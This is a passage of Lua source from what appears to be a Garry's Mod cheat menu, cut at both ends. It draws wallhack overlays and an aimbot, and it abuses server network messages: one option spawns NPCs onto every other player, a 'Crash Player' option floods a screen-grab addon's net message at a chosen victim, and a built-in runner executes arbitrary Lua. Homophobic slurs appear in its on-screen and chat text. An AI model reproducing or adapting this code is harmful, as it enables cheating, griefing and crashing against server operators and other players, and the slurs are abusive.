		    			local spos, epos = v:GetBonePosition(v:LookupBone(b.F)):ToScreen(), v:GetBonePosition(v:LookupBone(b.B)):ToScreen()
		    			if spos.visible && epos.visible then
		    				st.surface_SetDrawColor( st.string_ToColor(mdrconf.col["skeletoncolor"]) )
		           			st.surface_DrawLine( spos.x, spos.y, epos.x, epos.y )
		    			end
		    		end
		    	end
            end
		end

        if mdrconf.vars["PS_selfskeleton"] and mdrconf.vars["PS_third"] then
            for k, v in ipairs(st.ply()) do
                if IsValid(v) or v == st.me() or v:Alive() then 
                    for _, b in pairs( st.SkeletonTBL ) do
		               	if v:LookupBone(b.F) != nil && v:LookupBone(b.B) != nil then
		               		local spos, epos = v:GetBonePosition(v:LookupBone(b.F)):ToScreen(), v:GetBonePosition(v:LookupBone(b.B)):ToScreen()
		               		if spos.visible && epos.visible then
		               			st.surface_SetDrawColor( st.string_ToColor(mdrconf.col["selfskeletoncolor"]) )
		               			st.surface_DrawLine( spos.x, spos.y, epos.x, epos.y )
		               		end
		               	end
		            end
                end
            end
        end

        if mdrconf.vars["PS_hitbox"] then
            for k, v in ipairs(st.ply()) do
                if not IsValid(v) or v == st.me() or not v:Alive() or v:IsDormant() then continue end 
                if v:GetHitBoxGroupCount() != nil then
                	for grp = 0, v:GetHitBoxGroupCount() - 1 do 
                	 	for hbx = 0, v:GetHitBoxCount( grp ) - 1 do
                	 		local pos, ang = v:GetBonePosition( v:GetHitBoxBone(hbx, grp) )
                	 		local mins, maxs = v:GetHitBoxBounds(hbx, grp)
                	 		st.cam_Start3D()
                				st.render_DrawWireframeBox( pos, ang, mins, maxs, st.string_ToColor(mdrconf.col["hitboxcolor"]), true)
                			st.cam_End3D()
                		end
                	end
                end
            end
        end

        if mdrconf.vars["PS_selfhitbox"] and mdrconf.vars["PS_third"] then
            for k, v in ipairs(st.ply()) do
                if IsValid(v) and v == st.me() and v:Alive() then
                    if v:GetHitBoxGroupCount() != nil then
                    	for grp = 0, v:GetHitBoxGroupCount() - 1 do 
                    	 	for hbx = 0, v:GetHitBoxCount( grp ) - 1 do
                    	 		local pos, ang = v:GetBonePosition( v:GetHitBoxBone(hbx, grp) )
                    	 		local mins, maxs = v:GetHitBoxBounds(hbx, grp)
                    	 		st.cam_Start3D()
                    				st.render_DrawWireframeBox( pos, ang, mins, maxs, st.string_ToColor(mdrconf.col["selfhitboxcolor"]), true)
                    			st.cam_End3D()
                    		end
                    	end
                    end
                end
            end
        end 

        if mdrconf.vars["PS_espname"] then 
            for _, py in pairs(st.ply()) do 
                local hsv = HSVToColor( ( CurTime() * 50 ) % 360, 1, 1 )
                if not IsValid(py) or py == st.me() or not py:Alive() or py:IsDormant() then continue end 
                local weap = py:GetActiveWeapon()
                if getDarkRPVar then
                    local playerMoney = py:getDarkRPVar("money")
                end
                local screen_pos = (py:GetPos()+Vector(0, 0, 80)):ToScreen()
                local screen_poslocal = (st.me():GetPos()+Vector(0, 0, 80)):ToScreen()
                st.draw_SimpleTextOutlined(py:Nick(), "DermaDefault", screen_pos.x, screen_pos.y - 10, st.string_ToColor(mdrconf.col["espname"]),1, 1, 1, Color(30, 30, 30, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                if mdrconf.vars["PS_weapon"] then 
                    if IsValid(weap) then
                        local wow = weap:GetClass()
                        st.draw_SimpleTextOutlined(wow, "DermaDefault", screen_pos.x, screen_pos.y, st.string_ToColor(mdrconf.col["esparmor"]), 1, 1, 1, Color(30, 30, 30, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
                    end      
                end
                if mdrconf.vars["PS_espusergrp"] then 
                    st.draw_SimpleTextOutlined(py:GetUserGroup(), "DermaDefault", screen_pos.x, screen_pos.y - 20, st.string_ToColor(mdrconf.col["espusergrp"]),1, 1, 1,Color(30, 30, 30, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                end 
                if mdrconf.vars["PS_esphealth"] then 
                    st.draw_SimpleTextOutlined(py:Health(), "DermaDefault", screen_pos.x, screen_pos.y - 30, st.string_ToColor(mdrconf.col["esphealth"]),1, 1, 1, Color(30, 30, 30, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                end
                if mdrconf.vars["PS_esparmor"] then 
                    st.draw_SimpleTextOutlined(py:Armor(), "DermaDefault", screen_pos.x, screen_pos.y - 40, st.string_ToColor(mdrconf.col["esparmor"]), 1, 1, 1, Color(30, 30, 30, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) 
                end
                if mdrconf.vars["PS_espvelocity"] then 
                    st.draw_SimpleTextOutlined(st.math_Round(py:GetVelocity():Length()), "DermaDefault", screen_pos.x, screen_pos.y - 50, st.string_ToColor(mdrconf.col["espusergrp"]),1, 1, 1,Color(30, 30, 30, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                end 
                if mdrconf.vars["PS_friendesp"] then
                    if st.table_HasValue( st.friends, py:SteamID() ) then
                        st.draw_SimpleTextOutlined("Friend", "DermaDefault", screen_pos.x, screen_pos.y - 60, st.string_ToColor(mdrconf.col["espusergrp"]),1, 1, 1,Color(30, 30, 30, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                    else
                        st.draw_SimpleTextOutlined("Enemy", "DermaDefault", screen_pos.x, screen_pos.y - 60, st.string_ToColor(mdrconf.col["espusergrp"]),1, 1, 1,Color(30, 30, 30, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                    end
                end
                if mdrconf.vars["PS_moneyesp"] then
                    if playerMoney then
                        st.draw_SimpleTextOutlined(playerMoney.."$", "DermaDefault", screen_pos.x, screen_pos.y - 70, st.string_ToColor(mdrconf.col["espusergrp"]),1, 1, 1,Color(30, 30, 30, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                    end
                end
                
                if st.spec then
                    st.draw_SimpleTextOutlined("The Faggot", "DermaDefault", screen_poslocal.x, screen_poslocal.y, Color(hsv.r,hsv.g,hsv.b),1, 1, 1, Color(30, 30, 30, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                end
            end
        end

        if mdrconf.vars["PS_velocity"] then
            local py = st.me()
            if not IsValid(py) or not py:Alive() then return end
            local velocity = py:GetVelocity():Length2D() 
            st.surface_SetFont("DermaLarge") 
            st.surface_SetTextColor(255, 255, 255, 255) 
            local text = tostring(st.math_floor(velocity))
            local textWidth, textHeight = st.surface_GetTextSize(text)
            st.surface_SetTextPos((st.sw() - textWidth) / 2, st.sh() - 20 - textHeight / 2) 
            st.surface_DrawText(text) 
        end

        if mdrconf.vars["PS_trailrain"] then
            if st.me():GetPos() then
                for i = 1, #st.trailpos-1 do
                    local hsv = HSVToColor( ( CurTime() * 50 + i ) % 360, 1, 1 )
                    st.surface_SetDrawColor(hsv.r,hsv.g,hsv.b)
                    local pos = st.trailpos[i]:ToScreen()
                    local prevpos = st.trailpos[i+1]:ToScreen()
                    st.surface_DrawRect(pos.x,pos.y,4,4)
                    st.surface_DrawLine(pos.x,pos.y,prevpos.x,prevpos.y)
                end
            end    
            st.trailpos[#st.trailpos+1] = st.me():GetPos()
            if #st.trailpos > 300 then
                st.table_remove(st.trailpos,1)
            end
        end

        if mdrconf.vars["PS_aimbot"] then
            local bone = mdrconf.vars["PS_bone"]
            local cloply = GetPlayerInCircle()
            st.surface_DrawCircle(st.sw() / 2, st.sh() / 2, mdrconf.vars["PS_aimbotFOV"] * 8, st.string_ToColor(mdrconf.col["fovcircle"]))
            if cloply then
                local boneIndex = cloply:LookupBone(bone)
                if boneIndex then
                    local pos = cloply:GetBonePosition(boneIndex)
                    local pos2 = cloply:GetBonePosition(boneIndex)
                    if VisibleCheck(cloply, pos2, predticks) then
                        if pos then
                            pos = pos:ToScreen()
                       
                            st.surface_SetDrawColor( st.string_ToColor(mdrconf.col["snapline"]) )
                            st.surface_DrawLine( pos.x, pos.y, st.sw() / 2, st.sh() / 2 )
                            st.surface_SetDrawColor( st.string_ToColor(mdrconf.col["bonebox"]) )
                            st.surface_DrawOutlinedRect(pos.x - 5 / 2, pos.y - 5 / 2, 5,5) 
                        end
                    end
                end
            end
        end

        local phys = mdrconf.vars["PS_physlin"]
        if st.physlineOn == true and mdrconf.vars["PS_physline"] then
            st.cam_Start3D()
                st.render_SetMaterial(Material(phys))
                st.render_DrawBeam(st.CPos, st.entPOS , 5, 1, 1  )
                st.render_DrawLine(st.CPos, st.entPOS  )
            st.cam_End3D()
            return
        end
    end

    function PSTICK()

        if mdrconf.vars["PS_chatspam"] and CurTime() > st.chatdelayspam then
            st.runco("say",mdrconf.vars["chatspamsentence"])
            st.chatdelayspam = CurTime() + 0.5
        end

        if mdrconf.vars["PS_freecam"] then
            if (st.input_IsKeyDown(KEY_O)) then
                if (!st.keyPressed) then
                    st.freecamEnabled = !st.freecamEnabled
                    st.freecamAngles2 = st.me():EyeAngles()
                    st.freecamPos = st.me():EyePos()
                    st.keyPressed = true
                end
            else
                st.keyPressed = false
            end
        end

        if mdrconf.vars["PS_fakelag"] then
            if not IsValid(st.me()) then return end
            st.tC = st.tC + 1
            if st.tC >= st.flT then
                st.bP = st.me():GetPos()
                st.tC = 0 
            end
        else
            st.tC = 0 
        end

        if mdrconf.vars["PS_physrainbow"] then
            local col = HSVToColor((RealTime() * 50) % 360, 1, 1)
            if st.me():Alive() and IsValid(st.me():GetActiveWeapon()) and st.me():GetActiveWeapon():GetClass() == "weapon_physgun" then
                st.me():SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
            end
        end

        if mdrconf.vars["PS_vjbase"] then
            if st.input_IsKeyDown(KEY_P) and not st.iskeydown then 
                st.iskeydown = true 
                createdframe(function(value,selected,spawntime)
                    local class= IsValid(st.me():GetActiveWeapon() ) and st.me():GetActiveWeapon():GetClass() or "gmod_tool"
                    local DefaultConVars = {
                        ["vjstool_npcspawner_fritoplyallies"]	=	1,
                        ["vjstool_npcspawner_nextspawntime"]	=	tonumber(spawntime),
                        ["vjstool_npcspawner_PlaySound"]	=	0,
                        ["vjstool_npcspawner_spawnent"]	=	"None",
                        ["vjstool_npcspawner_spawnentname"]	=	"Unknown",
                        ["vjstool_npcspawner_spawnnpclass"]	=	value,
                        ["vjstool_npcspawner_spawnpos_forward"]	=	0,
                        ["vjstool_npcspawner_spawnpos_right"]	=	0,
                        ["vjstool_npcspawner_spawnpos_up"]	=	0,
                        ["vjstool_npcspawner_weaponequip"]	=	"None",
                        ["vjstool_npcspawner_weaponequipname"]	=	"None",
                    }
                    local tbl = {
                        {
                            Entities = value,
                            EntityName = "",
                            Relationship= {
                                Class   = "",
                                FriToPlyAllies  =       1,
                            },
                            SpawnPosition   = Vector(0.000000 ,0.000000 ,0.000000),
                            WeaponsList     =      ""
                        },
                    }
                    st.runco("use","gmod_tool")
                    st.timer_Simple(0.001,function()
                        if selected == "give" then 
                            st.net_Start("vj_npcspawner_sv_create")
                                st.net_WriteTable(DefaultConVars)
                                st.net_WriteVector(st.me():GetPos())
                                st.net_WriteType(tbl)
                                st.net_WriteString("LeftClick")
                            st.net_SendToServer()
                        elseif selected == "spawn" then 
                            st.net_Start("vj_npcspawner_sv_create")
                            st.net_WriteTable(DefaultConVars)
                            st.net_WriteVector(st.freecamPos)
                            st.net_WriteType(tbl)
                            st.net_WriteString("LeftClick")
                            st.net_SendToServer()
                        elseif selected == "spawnall" then
                            for k ,v in ipairs(st.ply()) do 
                                if v ~= st.me() then 
                                    st.net_Start("vj_npcspawner_sv_create")
                                    st.net_WriteTable(DefaultConVars)
                                    st.net_WriteVector(v:GetPos())
                                    st.net_WriteType(tbl)
                                    st.net_WriteString("LeftClick")
                                    st.net_SendToServer()
                                end
                            end
                        end
                        st.timer_Simple(0.001,function()
                            st.runco("use",class)
                        end)
                    end)
                end)
            elseif not st.input_IsKeyDown(KEY_G) and st.iskeydown then 
                st.iskeydown = false 
            end
        end
        local cur_pos = LocalPlayer():GetNetworkOrigin()
        if cur_pos:DistToSqr(ult_pos) > 4096 then
            //st.prnt("breaking lc ")
            mdrconf.vars["PS_BreakLC"] = true
        else
            mdrconf.vars["PS_BreakLC"] = false
        end
        ult_pos = cur_pos
        if mdrconf.vars["PS_INTERPOLATION"] then
            for _, v in pairs(st.ply()) do
                local pos = v:GetNetworkOrigin()
                v:SetRenderOrigin( pos )
                v:SetNetworkOrigin( pos )  
                v:InvalidateBoneCache()
                v:SetupBones()
            end
        end
    end

    function PSDRAWBEAM(ply,wep,enabled,targ,bone,pos)
        local lol = {}

        if (IsValid(ply)) and (ply == st.me()) and (enabled) and IsValid(targ) and targ:GetClass() == "prop_physics" then
            if (!lol[targ]) then
            	lol[targ] = true
            end
        end

        if mdrconf.vars["PS_physline"] then end
            if lol[targ] then
                    st.CPos = st.me():EyePos() + EyeAngles():Forward() * 50 
                    st.prop = targ
                    st.propID = targ:GetModel()
                    st.entPOS = targ:LocalToWorld(targ:OBBCenter())
                    st.entPOSI = targ:GetPos()
                    st.propmod = st.propID
                    st.physlineOn = true
                return false
            else
                if ply == st.me() then
                    st.propID = ""
                    st.physlineOn = false
                else
                    if IsValid(targ) and IsValid(ply) then
                    	st.srcPos = wep:GetAttachment( 1 ).Pos
                    	if ( !ply:ShouldDrawLocalPlayer() and ply == st.me() ) then
                    		if ply:GetViewModel():GetAttachment( 1 ).Pos then
                    			st.srcPos = ply:GetViewModel():GetAttachment( 1 ).Pos
                    		end
                    	end
                    	st.entPOS2 = targ:LocalToWorld(targ:OBBCenter())
                    	st.otherphysline = true
                    else
                    	st.otherphysline = false
                    end
                end
                return false
            end
        return true
    end

    function PSCHAMS(bD, bS)

    if gui.IsGameUIVisible() then return end

        local col1 = st.string_ToColor(mdrconf.col["selfchamscol"])
        local colw1 = st.string_ToColor(mdrconf.col["selfweaponchamscol"])
        local colp1 = st.string_ToColor(mdrconf.col["chamscolply1"])
        local colp2 = st.string_ToColor(mdrconf.col["chamscolply2"])
        local colpp1 = st.string_ToColor(mdrconf.col["chamscolprop1"])
        local colpp2 = st.string_ToColor(mdrconf.col["chamscolprop2"])

        if mdrconf.vars["PS_chamsply"] then
            for _, v in pairs(st.ply()) do
                if not IsValid(v) or v == st.me() or not v:Alive() or v:IsDormant() then continue end 
                st.render_SetColorModulation( colp2.r /255, colp2.g /255, colp2.b /255)
                st.render_MaterialOverride(st.textured_z)
                v:DrawModel()
                st.render_SetColorModulation( colp1.r /255, colp1.g /255, colp1.b /255)
                st.render_MaterialOverride(st.textured)
                v:DrawModel()
                st.render_MaterialOverride(nil)
                st.render_SetColorModulation(1, 1, 1) 
                st.render_SuppressEngineLighting(false) 
            end
        end

        if mdrconf.vars["PS_selfchams"] then
            st.render_SetColorModulation( col1.r /255, col1.g /255, col1.b /255)
            st.render_MaterialOverride(st.textured_z)
            st.me():DrawModel()
            st.render_SetColorModulation( col1.r /255, col1.g /255, col1.b /255)
            st.render_MaterialOverride(st.textured)
            st.me():DrawModel()
    
            st.render_MaterialOverride(nil)
            st.render_SetColorModulation(1, 1, 1) 
            st.render_SuppressEngineLighting(false) 
        end

        if mdrconf.vars["PS_selfweaponchams"] then
            local w = st.me():GetActiveWeapon()
            st.render_SetColorModulation( colw1.r /255, colw1.g /255, colw1.b /255)
            st.render_MaterialOverride(st.textured)
            if IsValid(w) then w:DrawModel() end
            st.render_MaterialOverride(nil)
            st.render_SetColorModulation(1, 1, 1) 
        end

        if mdrconf.vars["PS_chamsprop"] then
            for k,v in next, st.ents_FindByClass("prop_physics") do
                if not IsValid(v) or v:IsDormant() then continue end
                st.render_SetColorModulation( colpp2.r /255, colpp2.g /255, colpp2.b /255)
                st.render_MaterialOverride(st.textured_z)
                v:DrawModel()
                st.render_SetColorModulation( colpp1.r /255, colpp1.g /255, colpp1.b /255)
                st.render_MaterialOverride(st.textured)
                v:DrawModel()
                st.render_MaterialOverride(nil)
                st.render_SetColorModulation(1, 1, 1) 
                st.render_SuppressEngineLighting(false) 
            end
        end

        if mdrconf.vars["PS_boxply"] then
            for k, v in pairs(st.ply()) do
                local pos = v:GetPos() + Vector(0, 0, 67 / 2)
                if not IsValid(v) or v == st.me() or not v:Alive() or v:IsDormant() then continue end 
                if pos:ToScreen().x < st.sw() and pos:ToScreen().y < st.sh() then
                    st.cam_Start3D()
                        st.render_DrawWireframeBox(v:GetPos(), v:GetAngles(),  v:OBBMaxs() - Vector(1.5, 1.5, 0.5),  v:OBBMins() + Vector(1.5, 1.5, 0.5), st.string_ToColor(mdrconf.col["boxplycolor1"]))
                        st.render_DrawWireframeBox(v:GetPos(), v:GetAngles(),  v:OBBMaxs() - Vector(0.5, 0.5, -0.5), v:OBBMins() + Vector(0.5, 0.5, -0.5), st.string_ToColor(mdrconf.col["boxplycolor1"]))
                        st.render_DrawWireframeBox(v:GetPos(), v:GetAngles(),  v:OBBMaxs() - Vector(1, 1, 0.5),  v:OBBMins() + Vector(1, 1, 0.5), st.string_ToColor(mdrconf.col["boxplycolor1"]))
                    st.cam_End3D()
                end
            end
        end

        if mdrconf.vars["PS_selfbox"] and mdrconf.vars["PS_third"] then
            for k, v in pairs(st.ply()) do
                local pos = v:GetPos() + Vector(0, 0, 67 / 2)
                if not IsValid(v) or not v:Alive() or v:IsDormant() then continue end 
                if pos:ToScreen().x < st.sw() and pos:ToScreen().y < st.sh() then
                    st.cam_Start3D()
                        st.render_DrawWireframeBox(st.me():GetPos(), Angle(0, 0, 0),  v:OBBMaxs() - Vector(1.5, 1.5, 0.5),  v:OBBMins() + Vector(1.5, 1.5, 0.5), st.string_ToColor(mdrconf.col["selfboxplycolor1"]))
                        st.render_DrawWireframeBox(st.me():GetPos(), Angle(0, 0, 0),  v:OBBMaxs() - Vector(0.5, 0.5, -0.5), v:OBBMins() + Vector(0.5, 0.5, -0.5), st.string_ToColor(mdrconf.col["selfboxplycolor1"]))
                        st.render_DrawWireframeBox(st.me():GetPos(), Angle(0, 0, 0),  v:OBBMaxs() - Vector(1, 1, 0.5),  v:OBBMins() + Vector(1, 1, 0.5), st.string_ToColor(mdrconf.col["selfboxplycolor1"]))
                    st.cam_End3D()
                end
            end
        end

        if mdrconf.vars["PS_boxprop"] then
            for k,v in next, st.ents_FindByClass("prop_physics") do
                local pos = v:GetPos() + Vector(0, 0, 67 / 2)
                if not IsValid(v) or v:IsDormant() then continue end 
                if pos:ToScreen().x < st.sw() and pos:ToScreen().y < st.sh() and v ~= st.me() then
                    st.cam_Start3D()
                        st.render_DrawWireframeBox(v:GetPos(), v:GetAngles(),  v:OBBMaxs() - Vector(1.5, 1.5, 0.5),  v:OBBMins() + Vector(1.5, 1.5, 0.5), st.string_ToColor(mdrconf.col["boxpropcolor1"]))
                        st.render_DrawWireframeBox(v:GetPos(), v:GetAngles(),  v:OBBMaxs() - Vector(0.5, 0.5, -0.5), v:OBBMins() + Vector(0.5, 0.5, -0.5), st.string_ToColor(mdrconf.col["boxpropcolor1"]))
                        st.render_DrawWireframeBox(v:GetPos(), v:GetAngles(),  v:OBBMaxs() - Vector(1, 1, 0.5),  v:OBBMins() + Vector(1, 1, 0.5), st.string_ToColor(mdrconf.col["boxpropcolor1"]))
                    st.cam_End3D()
                end
            end
        end

        local isCanTrace = true
        function Trace()
            if not isCanTrace then
                return
            end
            isCanTrace = false
            local index = 1
            local indexF = index * 0.1
            local trace = st.util_TraceEntity({
                start = st.me():GetPos(),
                endpos = st.physenv_GetGravity() * (0.5 * indexF * indexF) + st.me():GetVelocity() * indexF + st.me():GetPos(),
                filter = st.me()
            }, st.me())
            while not trace.Hit do
                index = index + 1
                indexF = index * 0.1
                local indexFN = (index - 1) * 0.1
                trace = st.util_TraceEntity({
                    start = st.physenv_GetGravity() * (0.5 * indexFN * indexFN) + st.me():GetVelocity() * indexFN + st.me():GetPos(),
                    endpos = st.physenv_GetGravity() * (0.5 * indexF * indexF) + st.me():GetVelocity() * indexF + st.me():GetPos(),
                    filter = st.me()
                }, st.me())
                if index > 256 then
                    break
                end
            end
            isCanTrace = true
            return trace.HitPos
        end

        if mdrconf.vars["PS_fallbox"] then
            if not st.me():OnGround() then 
                local predictedPos = Trace()
                st.render_DrawWireframeBox(predictedPos, Angle(),  st.me():OBBMins() - Vector(2.5, 2.5, 1.5),  st.me():OBBMaxs() + Vector(2.5, 2.5, 1.5), st.string_ToColor(mdrconf.col["fallboxcolor1"]))
                st.render_DrawWireframeBox(predictedPos, Angle(),  st.me():OBBMins() - Vector(1.5, 1.5, 0), st.me():OBBMaxs() + Vector(1.5, 1.5, 0), st.string_ToColor(mdrconf.col["fallboxcolor1"]))
                st.render_DrawWireframeBox(predictedPos, Angle(),  st.me():OBBMins() - Vector(2, 2, 1),  st.me():OBBMaxs() + Vector(2, 2, 1), st.string_ToColor(mdrconf.col["fallboxcolor1"]))
            end
        end

        if mdrconf.vars["PS_fakelag"] and mdrconf.vars["PS_third"] then
            if st.bP then
                fklgbox(st.bP)
            end
        end

    end

    function createdframe(callback)

        if IsValid(st.df) then st.df:Remove() end
        st.df = st.vgui_Create("DFrame")
        st.df:SetSize(500,250)
        st.df:Center()
        st.df:MakePopup()
        st.df:SetTitle("")
        st.df:ShowCloseButton(false)
        function st.df:Paint(w, h)
            st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false )
            st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
            st.surface_DrawTexturedRect(0, 0, w, h)
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
            st.surface_DrawOutlinedRect(0,0,w,h,2)
        end

        local Close = st.vgui_Create("DButton", st.df)
        Close:SetPos(455, 5)
        Close:SetText("X")
        Close:SetSize(40,25)
        function Close:DoClick()
           st.df:Close()
        end
        function Close:Paint(w,h)
            local v = self:IsDown()
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
            st.surface_DrawOutlinedRect(0,0,w,h,2)
            if !v and !self:IsHovered() then return end
            if v then
                st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
            else
                st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
            end
            st.surface_DrawRect(5,5,w-10,h-10)
        end

        local db = st.vgui_Create("DButton",st.df)
        db:Dock(BOTTOM)
        db:SetTall(50)
        db:SetText("Valider")
        function db:Paint(w,h)
            local v = self:IsDown()
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
            st.surface_DrawOutlinedRect(0,0,w,h,2)
            if !v and !self:IsHovered() then return end
            if v then
                st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
            else
                st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
            end
            st.surface_DrawRect(5,5,w-10,h-10)
        end

        local spawntime = st.vgui_Create("DNumSlider",st.df)
        spawntime:Dock(BOTTOM)
        spawntime:SetTall(50)
        spawntime:SetMin(0)
        spawntime:SetMax(1000)
        spawntime:SetDecimals(0)
        spawntime:SetValue(500)
        spawntime:SetText("Spawntime")

        local dt = st.vgui_Create("DTextEntry",st.df)
        dt:Dock(BOTTOM)
        dt:SetTall(50)
        dt:SetPlaceholderText("Entrez la class")

        local combox = st.vgui_Create("DComboBox",st.df)
        combox:Dock(BOTTOM)
        combox:SetTall(50)
        combox:AddChoice("Give","give")
        combox:AddChoice("Spawn","spawn")
        combox:AddChoice("Spawnall","spawnall")
        combox:SetValue("give")
        db.DoClick = function()
            local str,data = combox:GetSelected()
            if not str and not data then 
                data = "give" 
            end
            callback(dt:GetValue(),data,spawntime:GetValue())
            st.df:Remove()
        end

    end
    function gettracepos()

        local startpos = EyePos()
        local endpos = startpos + EyeAngles():Forward() * 10000

        local trace = st.util_TraceLine({
            start = startpos,
            endpos = endpos,
            filter = st.me(),
            mask = MASK_SHOT_HULL
        })
        return trace.HitPos
    end

    function PSSKYBOX()
        if mdrconf.vars["PS_skyboxremove"] then
        	st.render_Clear(0,0,0,255)
        end
        return true	
    end

    function PSPLAYERHURT(data)

        local soundss = mdrconf.vars["PS_hit"]
    	local id = data.userid			
    	local attackerid = data.attacker

    	if mdrconf.vars["PS_hitsound"] then 
            if attackerid == st.me():UserID() then
            	st.surface_PlaySound(soundss)
            end
        end
    end

    local scrPanel = st.vgui_Create("DScrollPanel", Panel4)
    scrPanel:SetSize(900, 500)
    local luaEditor = st.vgui_Create("DTextEntry", scrPanel)
    luaEditor:SetMultiline(true)
    luaEditor:SetSize(900, 500)
    luaEditor:SetPos(0,0)
    luaEditor:SetVerticalScrollbarEnabled(true)
    luaEditor.Paint = function(self, w, h)
        st.draw_RoundedBox(0, 0, 0, w, h, Color(30, 30, 30, 255))
        self:DrawTextEntryText(Color(255, 255, 255, 255), Color(30, 130, 255, 255), Color(255, 255, 255, 255))
    end

    local vbar = scrPanel:GetVBar()
    vbar.Paint = function(self, w, h)
        st.draw_RoundedBox(4, 0, 0, w, h, Color(20, 20, 20, 255))
    end

    vbar.btnUp.Paint = function(self, w, h)
        st.draw_RoundedBox(4, 0, 0, w, h, Color(50, 50, 50, 255))
    end

    vbar.btnDown.Paint = function(self, w, h)
        st.draw_RoundedBox(4, 0, 0, w, h, Color(50, 50, 50, 255))
    end

    vbar.btnGrip.Paint = function(self, w, h)
        st.draw_RoundedBox(15, 0, 0, w, h, Color(70, 70, 70, 255))
    end

    local btnRunLua = st.vgui_Create("DButton", Panel4)
    btnRunLua:SetText("Run Lua Script")
    btnRunLua:SetSize(900, 35)
    btnRunLua:SetPos(0, 500)
    btnRunLua.DoClick = function()
        local luaCode = luaEditor:GetValue()
        local cleanedLuaCode = ""
        for line in st.string_gmatch(luaCode, "[^\r\n]+") do
            cleanedLuaCode = cleanedLuaCode .. line .. "\n"
        end
        local success, errorMsg = pcall(RunString, cleanedLuaCode)
        if not success then
            st.prnt("ERROR : " .. errorMsg)
        end
    end

    local searchBox = st.vgui_Create("DTextEntry", Panel3)
    searchBox:SetSize(400, 30)
    searchBox:SetPos(485, 0)
    searchBox:SetPlaceholderText("Search Someone...")
    local playerList = st.vgui_Create("DListView", Panel3)
    playerList:SetSize(400,500)
    playerList:SetPos(485,30)
    playerList:SetMultiSelect(false)
    playerList:AddColumn("PFP")
    playerList:AddColumn("NAME")
    playerList:AddColumn("STEAM ID")
    playerList:SetDataHeight(64)
    playerList.VBar.btnGrip.Paint = function(self, w, h)
        st.draw_RoundedBox(4, 0, 0, w, h, st.string_ToColor(mdrconf.col["Gray"])) 
    end
    playerList.VBar.Paint = function(self, w, h)
        st.draw_RoundedBox(4, 0, 0, w, h, st.string_ToColor(mdrconf.col["Gray"])) 
    end
    playerList.Paint = function(self, w, h)
        st.draw_RoundedBox(0, 0, 0, w, h, st.string_ToColor(mdrconf.col["Gray"])) 
    end 

    function plylistrefr()
        playerList:Clear() 
        local searchText = string.lower(searchBox:GetValue())
        for _, py in pairs(st.ply()) do
            local playerName = py:Nick()
            if searchText == "" or string.find(string.lower(playerName), searchText, 1, true) then
                local line = playerList:AddLine("", playerName, py:SteamID())
                local avatar = st.vgui_Create("AvatarImage", line)
                avatar:SetSize(64, 64)
                avatar:SetPlayer(py, 64)
                playerList.Columns[1]:SetFixedWidth(70)
                line.OnRightClick = function()
                    local menu = DermaMenu()
                    local submenu = menu:AddSubMenu( "Utils" )
                    menu:AddSpacer()
                    local submenuspec = menu:AddSubMenu( "spec" )
                    submenu:AddOption("Copy SteamID32", function()
                        SetClipboardText(py:SteamID())
                    end)
                    submenu:AddSpacer()
                    submenu:AddOption("Copy SteamID64", function()
                        SetClipboardText(py:SteamID64())
                    end)
                    submenu:AddSpacer()
                    submenu:AddOption("Copy Entity-Id", function()
                        SetClipboardText(py:EntIndex())
                    end)
                    menu:AddSpacer()
                    menu:AddOption("Add/Delete Friendlist", function()
                        FRIENDLIST(py:SteamID())
                    end)
                    submenuspec:AddOption("Spectate", function()
                        local targ = player.GetBySteamID(py:SteamID())
                        if IsValid(targ) then
                            st.targetspec = targ
                        else
                            st.prnt("not a player dumb ass")
                        end
                        st.spec = true
                    end)
                    submenuspec:AddSpacer()
                    submenuspec:AddOption("UnSpectate", function()
                        st.targetspec = nil
                        st.spec = false
                    end)
                    menu:AddSpacer()
                    if GTS then
                         menu:AddOption("Crash Player <3", function()
                            if py:EntIndex() == LocalPlayer():EntIndex() then
                                st.chat_AddText(Color( 195, 90, 90 ),"don't try crashing you fucking Faggots" )
                            else
                                st.chat_AddText(Color( 195, 90, 90 ),"Crash Send On : " .. py:Nick() .. " " .. py:SteamID() )
                                st.timer_Create("MegaRoleplay Player", 0, 250, function()
                                    st.net_Start("GimmeThatScreen_Provide")
                                    st.net_WriteBool(true)
                                    st.net_WriteString(100)
                                    st.net_WriteEntity(Entity(py:EntIndex()))
                                    st.net_WriteString("Local")
                                    st.net_SendToServer()
                                end)
                            end
                        end)
                    end
                    menu:Open()
                end
            end
        end

    end
    st.timer_Create("plylistrefrTimer", 60, 0, plylistrefr)
    searchBox.OnChange = function()
        plylistrefr()
    end
    plylistrefr()
    -- fake gts
    st.concommand_Add("Gtsbp", function()

    	if ( IsValid( GTS.Interface.PSPnl ) ) then GTS.Interface.PSPnl:Remove() end
    	GTS.Interface.PSPnl = st.vgui_Create( "DFrame" )

    	local frame = GTS.Interface.PSPnl
    	frame:SetSize( 900, 650 )
    	frame:Center()
    	frame:SetTitle( "" )
    	frame:SetAlpha( 0 )
    	frame:AlphaTo( 255, 0.3 )
    	frame:ShowCloseButton( false )
    	frame:MakePopup()
    	frame.selectedPlayer = nil
    	frame.OnRemove = function( self )
    		st.net_Start( "GimmeThatScreen_RequestPVS" )
    		st.net_SendToServer()
    	end

    	frame.Paint = function( self, w, h )
